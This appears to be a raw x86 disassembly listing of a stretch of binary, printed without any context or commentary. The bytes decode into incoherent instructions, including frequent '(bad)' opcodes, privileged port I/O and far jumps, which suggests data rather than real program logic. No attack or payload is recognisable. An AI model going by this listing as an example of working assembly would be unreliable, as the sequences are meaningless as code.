  421547:	add    edx,edi
  421549:	xchg   BYTE PTR [edx-0x5b7560c8],bl
  42154f:	js     0x421589
  421551:	mov    BYTE PTR [edx+0x4c],ah
  421554:	shl    DWORD PTR [ebx+edi*4-0x51241337],1
  42155b:	cmovno eax,DWORD PTR [edi-0x4f]
  42155f:	pop    eax
  421560:	popf   
  421561:	add    ebx,DWORD PTR [eax+0x5b442f23]
  421567:	cmp    DWORD PTR [ecx],edx
  421569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42156a:	dec    esi
  42156b:	sbb    eax,0x8666558
  421570:	push   ds
  421571:	(bad)  
  421573:	push   ebp
  421574:	jp     0x42158b
  421576:	xchg   ecx,eax
  421577:	adc    eax,0x931186f9
  42157c:	pusha  
  42157d:	sar    DWORD PTR [edi+0x1f],cl
  421580:	(bad)  
  421581:	mov    ecx,0x782c2122
  421586:	mov    ds:0xc078b7a6,eax
  42158b:	fcomp  DWORD PTR [ecx+eax*1+0x3201f4ee]
  421592:	jmp    0x42160b
  421594:	mov    bl,0xbe
  421596:	mov    ebp,0x65c6a3dd
  42159b:	ficom  WORD PTR [edi-0x60]
  42159e:	mov    ecx,0x4e8a3626
  4215a3:	mov    esp,0xe9d13af6
  4215a8:	jecxz  0x42152d
  4215aa:	push   es
  4215ab:	dec    esi
  4215ac:	ja     0x4215b1
  4215ae:	out    0xea,al
  4215b0:	das    
  4215b1:	dec    eax
  4215b2:	push   ss
  4215b3:	in     al,0xc2
  4215b5:	mov    eax,0xe974466c
  4215ba:	sti    
  4215bb:	sbb    al,0xcb
  4215bd:	(bad)  
  4215be:	push   edi
  4215bf:	xchg   edx,eax
  4215c0:	adc    DWORD PTR [edi+0x90acfbc],eax
  4215c6:	ret    0x30da
  4215c9:	data16 into 
  4215cb:	stos   BYTE PTR es:[edi],al
  4215cc:	sbb    al,0x89
  4215ce:	ins    BYTE PTR es:[edi],dx
  4215cf:	jo     0x4215e0
  4215d1:	lods   al,BYTE PTR ds:[esi]
  4215d2:	sbb    dh,BYTE PTR [eax-0x77]
  4215d5:	(bad)  
  4215d6:	dec    ebx
  4215d7:	stos   BYTE PTR es:[edi],al
  4215d8:	pop    ds
  4215d9:	jno    0x42164a
  4215db:	retf   
  4215dc:	in     al,dx
  4215dd:	push   0x28ab74c7
  4215e2:	xchg   edi,eax
  4215e3:	popa   
  4215e4:	fcomp  st(0)
  4215e6:	nop
  4215e7:	dec    esp
  4215e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215e9:	fist   DWORD PTR [edx+edx*1]
  4215ec:	adc    BYTE PTR [eax+ebp*1],ch
  4215ef:	sbb    DWORD PTR [edi],esp
  4215f1:	xor    dl,BYTE PTR [edi]
  4215f3:	inc    ecx
  4215f4:	lock lods eax,DWORD PTR ds:[esi]
  4215f6:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f8:	cmp    eax,0x680bc3f3
  4215fd:	mov    al,0x2e
  4215ff:	push   cs
  421600:	stos   DWORD PTR es:[edi],eax
  421601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421602:	xor    ch,BYTE PTR [edx-0x3fa2dc1d]
  421608:	add    BYTE PTR [esi+0x8bdc21a],ah
  42160e:	mov    eax,DWORD PTR [esi+0x6d]
  421611:	js     0x421599
  421613:	icebp  
  421614:	inc    ebp
  421615:	daa    
  421616:	ret    
  421617:	xchg   edx,eax
  421618:	dec    ecx
  421619:	mov    ebx,0xae9f99d0
  42161e:	jno    0x42164a
  421620:	adc    BYTE PTR [edx-0x28],bh
  421623:	jecxz  0x42169d
  421625:	push   eax
  421626:	setno  cl
  421629:	and    DWORD PTR [edi],ebp
  42162b:	jae    0x421673
  42162d:	mov    bh,cl
  42162f:	xchg   BYTE PTR [esi],al
  421631:	inc    eax
  421632:	mov    eax,0x5899753d
  421637:	repz sbb bl,bh
  42163a:	cwde   
  42163b:	pop    esi
  42163c:	fcomp  DWORD PTR [eax]
  42163e:	mov    eax,ecx
  421640:	add    cl,BYTE PTR [esi]
  421642:	and    BYTE PTR [ecx],ah
  421644:	mov    cl,0x17
  421646:	jecxz  0x421615
  421648:	mov    eax,0x93b95f1e
  42164d:	popa   
  42164e:	imul   edi,DWORD PTR [esi-0x4f],0xffffffbc
  421652:	add    bh,bh
  421654:	xchg   esp,eax
  421655:	cli    
  421656:	imul   edi,DWORD PTR [eax+0x6d],0x5b9e2a25
  42165d:	aaa    
  42165e:	and    DWORD PTR [eax+0xd2f74a7],0x6b010843
  421668:	sub    bh,ch
  42166a:	(bad)  
  42166b:	pop    ecx
  42166c:	pop    esi
  42166d:	pusha  
  42166e:	(bad)  
  42166f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421670:	pop    ss
  421671:	xchg   bh,dh
  421673:	in     al,0x2e
  421675:	push   esp
  421676:	pop    ds
  421677:	sub    bh,cl
  421679:	int    0xdb
  42167b:	test   eax,0x515938e0
  421680:	xchg   BYTE PTR [ebp-0x57],dl
  421683:	iret   
  421684:	ins    DWORD PTR es:[edi],dx
  421685:	inc    ebx
  421686:	pushf  
  421687:	aas    
  421688:	add    al,0xd6
  42168a:	jmp    0x9f67:0xd1ed05b2
  421691:	xor    dl,BYTE PTR [edx]
  421693:	add    dl,BYTE PTR [esi]
  421695:	jg     0x421648
  421697:	gs lock leave 
  42169a:	add    al,cl
  42169c:	std    
  42169d:	cld    
  42169e:	adc    ecx,DWORD PTR [ecx+0x7d]
  4216a1:	mov    ecx,0xacfac444
  4216a6:	sub    DWORD PTR [ebp-0x3f],esi
  4216a9:	xor    eax,0xf683e2f2
  4216ae:	retf   
  4216af:	xor    dl,ch
  4216b1:	mov    al,0x2b
  4216b3:	jbe    0x4216e2
  4216b5:	mov    ah,0x9c
  4216b7:	cmp    DWORD PTR [ebp+ecx*2+0x69],0x36
  4216bc:	cmp    BYTE PTR [edx+eax*1],bh
  4216bf:	or     al,BYTE PTR [edi]
  4216c1:	adc    eax,0xe2c93424
  4216c6:	jmp    0x685d5623
  4216cb:	fld    TBYTE PTR [esi+ecx*1-0x23c42c35]
  4216d2:	pusha  
  4216d3:	dec    esi
  4216d4:	mov    ecx,0x403baca3
  4216d9:	popa   
  4216da:	not    BYTE PTR [ecx-0x14]
  4216dd:	cmc    
  4216de:	out    dx,al
  4216df:	in     eax,0x3c
  4216e1:	rcr    BYTE PTR [edi-0x43],1
  4216e4:	fdiv   DWORD PTR [eax-0x3d]
  4216e7:	call   0x3ae:0x6a91caae
  4216ee:	dec    edx
  4216ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216f1:	sub    cl,BYTE PTR [ebp-0x5b]
  4216f4:	pop    ebp
  4216f5:	push   ebp
  4216f6:	jne    0x1939c58a
  4216fc:	in     al,dx
  4216fd:	dec    eax
  4216fe:	xchg   edx,eax
  4216ff:	fadd   QWORD PTR [edx+edi*2+0x7b07141f]
  421706:	fist   WORD PTR [ebp+0x1ead0c5]
  42170c:	in     eax,dx
  42170d:	adc    bl,BYTE PTR [esi+0x7662a47e]
  421713:	stos   DWORD PTR es:[edi],eax
  421714:	loopne 0x4216af
  421716:	jp     0x4216f3
  421718:	mov    esi,0xa9d59665
  42171d:	sub    al,0x54
  42171f:	fnstenv [esi-0x3f09a558]
  421725:	xor    bl,ch
  421727:	test   eax,0xc99ddf36
  42172c:	(bad)  
  42172d:	lock mov ebp,0x6aed660
  421733:	les    esp,FWORD PTR [edx]
  421735:	in     al,0x45
  421737:	cdq    
  421738:	lods   eax,DWORD PTR ds:[esi]
  421739:	call   0x5fdffb25
  42173e:	xlat   BYTE PTR ds:[ebx]
  42173f:	addr16 sbb eax,0x424c676a
  421745:	loope  0x4216f4
  421747:	push   edi
  421748:	iret   
  421749:	jl     0x421769
  42174b:	push   esi
  42174c:	out    0xd8,al
  42174e:	jmp    0xce9f:0x363aafeb
  421755:	mov    bl,0x1f
  421757:	xor    eax,0x10767012
  42175c:	sbb    al,0x2e
  42175e:	push   esi
  42175f:	std    
  421760:	shr    BYTE PTR [ebx-0x70],cl
  421763:	loopne 0x421756
  421765:	dec    edx
  421766:	dec    esp
  421767:	ins    DWORD PTR es:[edi],dx
  421768:	aaa    
  421769:	in     al,dx
  42176a:	jge    0x4217b8
  42176c:	std    
  42176d:	bound  esi,QWORD PTR [ecx+edx*2]
  421770:	call   0x1a38693a
  421775:	fld    QWORD PTR [edi+0x26]
  421778:	xor    edi,DWORD PTR [eax-0x3f91a29f]
  42177e:	shl    BYTE PTR ds:0x76211356,cl
  421784:	std    
  421785:	jo     0x421754
  421787:	sub    bl,BYTE PTR [eax+ecx*2-0x478405b1]
  42178e:	and    bl,dh
  421790:	cs int 0xed
  421793:	jb     0x421763
  421795:	xor    bl,BYTE PTR [ebx]
  421797:	jecxz  0x421790
  421799:	ins    DWORD PTR es:[edi],dx
  42179a:	pop    esp
  42179b:	ja     0x42180c
  42179d:	test   dl,0xb1
  4217a0:	rol    DWORD PTR [ecx+0x32eeb815],1
  4217a6:	retf   
  4217a7:	sbb    eax,0x41ed7f57
  4217ac:	or     BYTE PTR [eax+0x6a],ah
  4217af:	mov    bh,0x45
  4217b1:	stos   BYTE PTR es:[edi],al
  4217b2:	mov    cl,ch
  4217b4:	test   esi,edi
  4217b6:	fmul   QWORD PTR [ecx]
  4217b8:	jne    0x4217f6
  4217ba:	xor    DWORD PTR [esi+0x5218819f],0xffffffbb
  4217c1:	jb     0x42180a
  4217c3:	mov    ?,WORD PTR [edi-0x7956d025]
  4217c9:	cwde   
  4217ca:	jl     0x42174d
  4217cc:	xlat   BYTE PTR ds:[ebx]
  4217cd:	bound  esp,QWORD PTR [ebp+0x6]
  4217d0:	mov    eax,0xfe8a147d
  4217d5:	cmp    al,0x38
  4217d7:	jo     0x421846
  4217d9:	mov    bh,0x0
  4217db:	push   0xa86b4d31
  4217e0:	push   esi
  4217e1:	cld    
  4217e2:	push   edi
  4217e3:	adc    al,0xa2
  4217e5:	(bad)  
  4217e6:	shl    DWORD PTR [ecx-0x2d],1
  4217e9:	das    
  4217ea:	sub    cl,ah
  4217ec:	pushf  
  4217ed:	mov    esp,0xa259eda6
  4217f2:	imul   ebx,DWORD PTR ds:0x4d7b36,0xffffffa3
  4217f9:	mov    dl,0xa4
  4217fb:	pop    ebx
  4217fc:	mov    edi,0xf1a2e6
  421801:	inc    edi
  421802:	repz jmp 0x8978:0xbee84fd9
  42180a:	out    dx,eax
  42180b:	adc    al,0x18
  42180d:	sahf   
  42180e:	jnp    0x4217d2
  421810:	loope  0x4217a3
  421812:	mov    WORD PTR [ebx+0x51d7d965],?
  421818:	push   0xffffffd2
  42181a:	inc    ebx
  42181b:	dec    edx
  42181c:	(bad)  
  42181d:	fs adc al,0xc5
  421820:	scas   eax,DWORD PTR es:[edi]
  421821:	std    
  421822:	and    BYTE PTR ss:[eax-0x72a5b484],ch
  421829:	inc    esi
  42182a:	xor    DWORD PTR [ebx+0x2a],ecx
  42182d:	cld    
  42182e:	loop   0x4217ee
  421830:	iret   
  421831:	clc    
  421832:	inc    ebx
  421833:	inc    eax
  421834:	shr    DWORD PTR [esi+ecx*1],cl
  421837:	icebp  
  421838:	aaa    
  421839:	imul   ebp,edx,0x3afb0a64
  42183f:	lahf   
  421840:	std    
  421841:	mov    ds:0x9162bd09,eax
  421846:	nop
  421847:	dec    edi
  421848:	mov    bl,0xcd
  42184a:	fwait
  42184b:	push   0x522f0f65
  421850:	pop    edx
  421851:	cmp    DWORD PTR [eax-0x68303f53],esi
  421857:	adc    ebp,DWORD PTR [edi]
  421859:	sbb    cl,BYTE PTR [edx]
  42185b:	mov    ds:0xe78b3261,eax
  421860:	adc    eax,0x70de4880
  421865:	dec    eax
  421866:	jbe    0x42181b
  421868:	aaa    
  421869:	sub    ebx,DWORD PTR [ebp-0x613a0d73]
  42186f:	je     0x4218bb
  421871:	ss cwde 
  421873:	stc    
  421874:	and    edx,DWORD PTR [edx]
  421876:	cmp    BYTE PTR [eax+0x5],cl
  421879:	mov    bh,0x92
  42187b:	dec    edi
  42187c:	pop    edi
  42187d:	scas   eax,DWORD PTR es:[edi]
  42187e:	sti    
  42187f:	or     bl,BYTE PTR [esi-0x76]
  421882:	test   al,0xf8
  421885:	sbb    BYTE PTR [ecx],al
  421887:	gs sbb ecx,edi
  42188a:	mov    bl,dl
  42188c:	cdq    
  42188d:	pop    ds
  42188e:	scas   al,BYTE PTR es:[edi]
  42188f:	mov    edi,0x7ac22e62
  421894:	nop
  421895:	in     al,dx
  421896:	in     al,dx
  421897:	add    BYTE PTR [esi+0x2ac6d6a4],al
  42189d:	(bad)  
  42189e:	cmc    
  42189f:	sub    dl,0xae
  4218a2:	sub    DWORD PTR [esi+0x19cde5a1],esi
  4218a8:	sbb    ch,BYTE PTR [edi-0x69]
  4218ab:	call   0x6909:0xff4fa4d2
  4218b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218b3:	fs sahf 
  4218b5:	(bad)  
  4218b6:	jp     0x4218b1
  4218b8:	sar    DWORD PTR [ebp-0x273c510],1
  4218be:	sahf   
  4218bf:	push   cs
  4218c0:	dec    ecx
  4218c1:	xor    eax,0x5d8038ae
  4218c6:	fisttp WORD PTR [edx+0x32f1574d]
  4218cc:	out    0x3f,eax
  4218ce:	pop    ebx
  4218cf:	and    dl,bl
  4218d1:	cmp    ecx,DWORD PTR [edx+0x7]
  4218d4:	xor    eax,0xb61664ec
  4218da:	cld    
  4218db:	or     al,0x14
  4218dd:	ja     0x42186f
  4218df:	mov    cl,0x62
  4218e1:	mov    ds:0x68c25f1f,eax
  4218e6:	mov    BYTE PTR [esi+0x450745e6],bl
  4218ec:	cmp    dl,al
  4218ee:	loope  0x421941
  4218f0:	lock pop edx
  4218f2:	sub    DWORD PTR [edx-0x53],0x13
  4218f6:	imul   edx,DWORD PTR [edi-0x5d],0x810f5fb5
  4218fd:	add    DWORD PTR [edx+edx*2-0x5bd54d7f],ecx
  421904:	dec    edi
  421905:	(bad)
  421908:	and    ah,BYTE PTR [eax]
  42190a:	adc    esi,DWORD PTR [eax+0x6cba3378]
  421910:	or     DWORD PTR [eax+ebx*2+0x2b],edx
  421914:	xchg   esp,eax
  421915:	outs   dx,BYTE PTR ds:[esi]
  421916:	nop
  421917:	sbb    ah,dh
  421919:	sar    BYTE PTR [ecx],cl
  42191b:	fdiv   QWORD PTR [edi+0x6d]
  42191e:	sub    BYTE PTR [ebp-0x610777ec],0x27
  421925:	xor    eax,0xb6f5eef
  42192a:	(bad)  
  42192b:	and    bh,BYTE PTR [edx-0x7a]
  42192e:	push   esi
  42192f:	enter  0x1253,0xdd
  421933:	push   ecx
  421934:	bound  edi,QWORD PTR [ebp+0x18]
  421937:	scas   al,BYTE PTR es:[edi]
  421938:	sbb    DWORD PTR [esi-0x580e4db6],esp
  42193e:	dec    edi
  42193f:	push   ss
  421940:	dec    eax
  421941:	(bad)  
  421942:	ficom  WORD PTR [ebx-0x124ad57c]
  421948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421949:	imul   edx,esp,0xffffffdc
  42194c:	xor    BYTE PTR [esi+0x66],0x9d
  421950:	scas   eax,DWORD PTR es:[edi]
  421951:	inc    eax
  421952:	call   0x4ed2:0x8724aed
  421959:	adc    eax,0xf2bf509a
  42195e:	scas   al,BYTE PTR es:[edi]
  42195f:	loop   0x4219ba
  421961:	xor    ecx,DWORD PTR [ebp-0x5c]
  421964:	(bad)  
  421966:	imul   esp,DWORD PTR [edx+eiz*4],0x563a1bdc
  42196d:	cwde   
  42196e:	stos   DWORD PTR es:[edi],eax
  42196f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421970:	loop   0x4219b6
  421972:	fmul   st(3),st
  421974:	jb     0x4219cf
  421976:	mov    ah,0xc0
  421978:	in     al,0xc7
  42197a:	cwde   
  42197b:	fdiv   st(4),st
  42197d:	push   ebx
  42197e:	push   es
  42197f:	mov    ch,0xe4
  421981:	push   esp
  421982:	push   DWORD PTR [ebx]
  421984:	sub    DWORD PTR [edx+0x44],ebp
  421987:	ins    BYTE PTR es:[edi],dx
  421988:	push   esi
  421989:	sub    DWORD PTR [eax-0x35146ea1],ebx
  42198f:	or     al,0xf3
  421991:	mov    ch,0x74
  421993:	or     al,0xbd
  421995:	jmp    FWORD PTR [edx+0xc5dc491]
  42199b:	xor    BYTE PTR [esp+eax*1],bl
  42199e:	int    0x59
  4219a0:	dec    esi
  4219a1:	mov    BYTE PTR [ebp-0x22],0x57
  4219a5:	fwait
  4219a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219a7:	mov    edi,DWORD PTR [eax+edi*4-0x42]
  4219ab:	out    0xe2,al
  4219ad:	popf   
  4219ae:	sbb    BYTE PTR [edi],ch
  4219b0:	lds    edi,FWORD PTR [ebx-0x6]
  4219b3:	pusha  
  4219b4:	mov    cl,0xf2
  4219b6:	push   0x1d05d46a
  4219bb:	(bad)  
  4219bd:	clc    
  4219be:	ja     0x42197b
  4219c0:	fwait
  4219c1:	imul   ecx,DWORD PTR [eax],0xffffffc5
  4219c4:	cdq    
  4219c5:	imul   ebx,DWORD PTR [ebx+eax*4+0x5651d0ce],0x25
  4219cd:	push   cs
  4219ce:	rol    BYTE PTR [ebx+ecx*8],0xc3
  4219d2:	outs   dx,DWORD PTR ds:[esi]
  4219d3:	scas   al,BYTE PTR es:[edi]
  4219d4:	sub    cl,BYTE PTR [edi-0x22b760cd]
  4219da:	fs cmp al,0x64
  4219dd:	and    esp,DWORD PTR [eax-0x67d00c8d]
  4219e3:	gs stc 
  4219e5:	xchg   BYTE PTR [ebx-0x78ce8262],al
  4219eb:	(bad)  
  4219ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ee:	xor    BYTE PTR [ebx-0x1a268662],ah
  4219f4:	mov    eax,ds:0xaf1fdcc1
  4219f9:	cmp    dh,ch
  4219fb:	test   DWORD PTR [edi+0x1fa8d46c],ecx
  421a01:	ins    BYTE PTR es:[edi],dx
  421a02:	std    
  421a03:	mov    edi,0x6e7004b
  421a08:	les    ecx,FWORD PTR ds:0x6d7d9e5e
  421a0e:	sti    
  421a0f:	lock xchg ebx,eax
  421a11:	pop    esi
  421a12:	cmp    eax,0xb57a2a1e
  421a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a18:	les    ecx,FWORD PTR [ebx-0x22f6d9d1]
  421a1e:	mov    esi,0x4e2dc8da
  421a23:	test   esp,edx
  421a25:	mov    ch,0x47
  421a27:	test   al,0x2e
  421a29:	mov    dl,0x7e
  421a2b:	fucomip st,st(6)
  421a2d:	sar    DWORD PTR [ebp-0x4b],cl
  421a30:	outs   dx,DWORD PTR ds:[esi]
  421a31:	xchg   ebx,eax
  421a32:	int3   
  421a33:	(bad)  
  421a34:	lock add DWORD PTR gs:[ebp+0x51dc5b27],ebp
  421a3c:	pushf  
  421a3d:	mov    eax,0x649d463c
  421a42:	lock pop ebp
  421a44:	inc    esi
  421a45:	mov    edx,0x21545292
  421a4a:	ins    BYTE PTR es:[edi],dx
  421a4b:	lea    edi,[edx+edi*2+0xc]
  421a4f:	call   0x17868f23
  421a54:	cmp    ecx,ebp
  421a56:	loop   0x421aa7
  421a58:	mov    dl,0x2b
  421a5a:	enter  0x63ec,0xa
  421a5e:	adc    al,0x85
  421a60:	push   ss
  421a61:	dec    esp
  421a62:	lahf   
  421a63:	out    0x3a,al
  421a65:	lods   al,BYTE PTR ds:[esi]
  421a66:	pop    ecx
  421a67:	loop   0x421abe
  421a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a6a:	inc    ebp
  421a6b:	adc    eax,0x575ba63c
  421a70:	clc    
  421a71:	out    dx,al
  421a72:	push   eax
  421a73:	scas   al,BYTE PTR es:[edi]
  421a74:	imul   esi,DWORD PTR [edx],0xffffff85
  421a77:	pushf  
  421a78:	sbb    eax,edi
  421a7a:	xor    BYTE PTR [ecx+0x5f],bh
  421a7d:	iret   
  421a7e:	add    BYTE PTR [eax+ebp*2],al
  421a81:	sub    bl,BYTE PTR [ebp-0x3f]
  421a84:	jle    0x421ae0
  421a86:	jbe    0x421af4
  421a88:	popa   
  421a89:	xchg   edx,eax
  421a8a:	in     al,0xa5
  421a8c:	mov    al,0x9e
  421a8e:	retf   0x98e0
  421a91:	dec    esi
  421a92:	xor    BYTE PTR [edx+0x31],bl
  421a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a96:	mov    al,0xa5
  421a98:	fwait
  421a99:	popf   
  421a9a:	cmp    BYTE PTR [ebx],cl
  421a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a9d:	in     eax,0x16
  421a9f:	xor    edi,edx
  421aa1:	sar    DWORD PTR [ecx+0x7556dd01],1
  421aa7:	out    dx,al
  421aa8:	iret   
  421aa9:	(bad)  
  421aaa:	repnz and DWORD PTR [ebp-0x6d],edi
  421aae:	stc    
  421aaf:	push   esp
  421ab0:	les    esp,FWORD PTR [edi+0x4b5f9555]
  421ab6:	push   ss
  421ab7:	push   0xffffffca
  421ab9:	jl     0x421afa
  421abb:	xchg   ebx,eax
  421abc:	mov    ebp,0x6697d3ba
  421ac1:	test   esi,ebx
  421ac3:	les    ebx,FWORD PTR [ecx-0x2c949b5f]
  421ac9:	data16 and al,0xf5
  421acc:	xchg   ebp,eax
  421acd:	inc    edi
  421ace:	xchg   ebx,eax
  421acf:	xchg   edi,eax
  421ad0:	or     DWORD PTR [edi-0x77],0xffffffe3
  421ad4:	dec    esp
  421ad5:	mov    ebx,ecx
  421ad7:	ror    al,cl
  421ad9:	cmc    
  421ada:	call   0xbbb0bd01
  421adf:	mov    bh,0x85
  421ae1:	das    
  421ae2:	mov    ah,0xdf
  421ae4:	or     ah,BYTE PTR [ebx]
  421ae6:	test   BYTE PTR [edi+0x15d69bb9],ch
  421aec:	lds    eax,FWORD PTR [esi+0x65]
  421aef:	fimul  WORD PTR [edx+ebx*4+0x7b9d8e07]
  421af6:	in     eax,0x2e
  421af8:	int3   
  421af9:	hlt    
  421afa:	mov    BYTE PTR [edx-0x2c332696],dh
  421b00:	add    BYTE PTR [eax-0x17],al
  421b03:	pop    ebp
  421b04:	push   ss
  421b05:	cmp    al,0x9e
  421b07:	add    edi,edi
  421b09:	pop    ebx
  421b0a:	outs   dx,DWORD PTR ds:[esi]
  421b0b:	pop    ebp
  421b0c:	mov    al,ds:0x90d23aad
  421b11:	mov    cl,0x13
  421b13:	dec    ecx
  421b14:	add    al,0x3e
  421b16:	data16 adc al,0xf4
  421b19:	test   eax,0x8599762e
  421b1e:	stos   BYTE PTR es:[edi],al
  421b1f:	or     bl,al
  421b21:	in     eax,dx
  421b22:	and    al,0xa3
  421b24:	pop    ebx
  421b25:	outs   dx,DWORD PTR ds:[esi]
  421b26:	inc    ebp
  421b27:	cmp    al,0x78
  421b29:	cmp    ebx,ebx
  421b2b:	imul   ebx,DWORD PTR [esi-0x4877f2ec],0x4c4e8aa2
  421b35:	xchg   edx,eax
  421b36:	jo     0x421b0f
  421b38:	iret   
  421b39:	jno    0x421b20
  421b3b:	pop    DWORD PTR [eax]
  421b3d:	hlt    
  421b3e:	sbb    BYTE PTR [edi-0x6e87bf50],bl
  421b44:	je     0x421b1d
  421b46:	fs inc esp
  421b48:	fistp  QWORD PTR [esi-0x2]
  421b4b:	aad    0xa2
  421b4d:	lds    edx,FWORD PTR [esi+0x659935e7]
  421b53:	dec    ecx
  421b54:	(bad)  
  421b55:	dec    ecx
  421b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b57:	mov    edx,DWORD PTR [esi-0x4]
  421b5a:	inc    esp
  421b5b:	push   esp
  421b5c:	add    al,0x57
  421b5e:	loop   0x421b98
  421b60:	cwde   
  421b61:	pop    edx
  421b62:	add    cl,ch
  421b64:	test   BYTE PTR [edi-0xf],al
  421b67:	mov    al,ds:0x9f143c56
  421b6c:	(bad)  
  421b6d:	mov    ebx,0x22b8c837
  421b72:	stos   DWORD PTR es:[edi],eax
  421b73:	std    
  421b74:	lods   al,BYTE PTR ds:[esi]
  421b75:	shr    eax,cl
  421b77:	mov    ebp,0x273d86de
  421b7c:	or     esp,DWORD PTR [ebx+0x43fb9f3]
  421b82:	popa   
  421b83:	mov    ds:0x262e6548,eax
  421b88:	mov    ecx,0x7d8b4fb1
  421b8d:	scas   al,BYTE PTR es:[edi]
  421b8e:	jo     0x421b46
  421b90:	and    eax,0xdbdd52b9
  421b95:	in     eax,dx
  421b96:	dec    esp
  421b97:	out    0x72,al
  421b99:	sub    esp,DWORD PTR [edx+0xf]
  421b9c:	or     DWORD PTR [esi],edx
  421b9e:	sbb    DWORD PTR [ecx-0x5f6d338e],eax
  421ba4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  421ba6:	in     al,0x1c
  421ba8:	dec    ebp
  421ba9:	(bad)  
  421baa:	aad    0xf2
  421bac:	xchg   DWORD PTR [ecx+0x67a65a5c],esp
  421bb2:	or     ah,BYTE PTR ds:0x4824b8d6
  421bb8:	inc    esi
  421bb9:	test   al,0x20
  421bbb:	je     0x421b41
  421bbd:	or     dl,cl
  421bbf:	sbb    DWORD PTR [edx-0x3244caf6],edi
  421bc5:	popa   
  421bc6:	enter  0x1c78,0x6c
  421bca:	push   0x5b
  421bcc:	rcr    BYTE PTR [esi-0x8396a58],0xe8
  421bd3:	imul   eax,DWORD PTR [ebx+0x74ee58ff],0x69
  421bda:	mov    al,0xe
  421bdc:	push   ds
  421bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bde:	in     al,0x10
  421be0:	fnstenv [ebx-0x4e]
  421be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421be4:	jmp    0x84bf:0x122621bb
  421beb:	jnp    0x421bc3
  421bed:	cmp    eax,0xbc5a7bb6
  421bf2:	push   eax
  421bf3:	mov    edx,0xed905185
  421bf8:	mov    ebx,0x247e5133
  421bfd:	push   0x13274dea
  421c02:	mov    dl,0xf4
  421c04:	mov    bh,0x66
  421c06:	dec    ebp
  421c07:	jnp    0x421bbe
  421c09:	mov    cl,0x8d
  421c0b:	fadd   DWORD PTR [eax+0x1e497609]
  421c11:	out    0xd2,eax
  421c13:	jp     0x421bdf
  421c15:	push   esp
  421c16:	(bad)  
  421c17:	xor    ecx,0x79
  421c1a:	xor    DWORD PTR [edi-0x78],ecx
  421c1d:	xchg   edi,eax
  421c1e:	adc    al,0x3a
  421c20:	mov    eax,0x6430e75f
  421c25:	xchg   DWORD PTR [edi+0x3b4aaf54],edx
  421c2b:	ret    0xcb5e
  421c2e:	jecxz  0x421c27
  421c30:	add    al,0xa9
  421c32:	dec    eax
  421c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c34:	push   ebx
  421c35:	mov    edx,0x728d75a1
  421c3a:	test   eax,0x1d01e6cd
  421c3f:	nop
  421c40:	fnstsw WORD PTR [esi]
  421c42:	and    DWORD PTR [edi-0x2b],edx
  421c45:	aad    0xb9
  421c47:	push   eax
  421c48:	pop    ebx
  421c49:	jne    0x421c7b
  421c4b:	jmp    0xcb052993
  421c50:	adc    al,0xa
  421c52:	daa    
  421c53:	jg     0x421cd4
  421c55:	xor    al,0xd2
  421c57:	int3   
  421c58:	add    BYTE PTR [eax+0x6b2be428],bh
  421c5e:	popw   es
  421c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c61:	in     al,0x4c
  421c63:	inc    edx
  421c64:	or     eax,0x8013a00a
  421c69:	xchg   DWORD PTR [ecx-0x300f5572],edx
  421c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c70:	mov    eax,ds:0x9eb100e
  421c75:	div    BYTE PTR [edx]
  421c77:	test   DWORD PTR [esi],eax
  421c79:	dec    esi
  421c7a:	arpl   dx,di
  421c7c:	add    BYTE PTR [eax+esi*2+0x3f],bh
  421c80:	push   0x1cc4c5db
  421c85:	and    ebx,DWORD PTR [esi-0x26e9a653]
  421c8b:	pop    edi
  421c8c:	push   ebx
  421c8d:	dec    edx
  421c8e:	pop    edx
  421c8f:	out    0xcc,al
  421c91:	mov    edi,0x4f8354b6
  421c96:	push   ss
  421c97:	ins    DWORD PTR es:[edi],dx
  421c98:	mov    eax,gs:0xc320ba9e
  421c9e:	aas    
  421c9f:	xchg   edx,eax
  421ca0:	sbb    DWORD PTR [esi-0x1a],eax
  421ca3:	push   esi
  421ca4:	fcom   DWORD PTR [edx]
  421ca6:	retf   0x9679
  421ca9:	mov    eax,0x8946c58c
  421cae:	ret    0x3c34
  421cb1:	inc    esp
  421cb2:	adc    edi,esp
  421cb4:	daa    
  421cb5:	shl    BYTE PTR [esp+ecx*8+0x26],0x1a
  421cba:	jne    0x421c9e
  421cbc:	iret   
  421cbd:	loope  0x421d1a
  421cbf:	aam    0x60
  421cc1:	mov    bl,0xfb
  421cc3:	or     esp,0x206146fb
  421cc9:	adc    DWORD PTR [edx+eax*1-0x25ae0599],esi
  421cd0:	shr    DWORD PTR [ebp+0x673251cc],1
  421cd6:	cs stc 
  421cd8:	loopne 0x421d06
  421cda:	inc    eax
  421cdb:	adc    DWORD PTR [esi-0x5f1c70bd],esi
  421ce1:	out    dx,al
  421ce2:	mov    esp,0x622838c4
  421ce7:	adc    ebx,DWORD PTR [edx-0x1485aac6]
  421ced:	mov    ecx,0x13c32e63
  421cf2:	popa   
  421cf3:	loope  0x421ce6
  421cf5:	jno    0x421d1b
  421cf7:	fs int 0x23
  421cfa:	cmc    
  421cfb:	je     0x421d6d
